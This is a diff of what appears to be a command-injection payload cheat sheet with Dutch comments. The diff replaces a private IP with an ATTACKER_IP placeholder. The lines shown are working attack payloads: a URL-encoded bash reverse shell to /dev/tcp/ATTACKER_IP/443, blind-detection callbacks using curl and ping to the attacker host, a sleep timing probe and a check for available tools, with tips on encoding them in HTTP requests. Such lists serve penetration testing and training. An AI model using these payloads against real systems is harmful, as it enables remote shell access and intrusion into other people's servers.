@@ -20,11 +20,11 @@ $(id)
 # ; -> %3b
 # Spatie -> + of %20
 # === Reverse shell via command injection ===
-;bash -c 'bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261'
+;bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/443 0>%261'
 # Let op: & moet URL-encoded als %26 in HTTP requests
 # === Blind detection ===
-;curl http://10.0.0.1/cmdi_confirm
-;ping -c 1 10.0.0.1
+;curl http://ATTACKER_IP/cmdi_confirm
+;ping -c 1 ATTACKER_IP
 ;sleep 5
 # === Capability check (welke tools beschikbaar) ===
 ;which curl
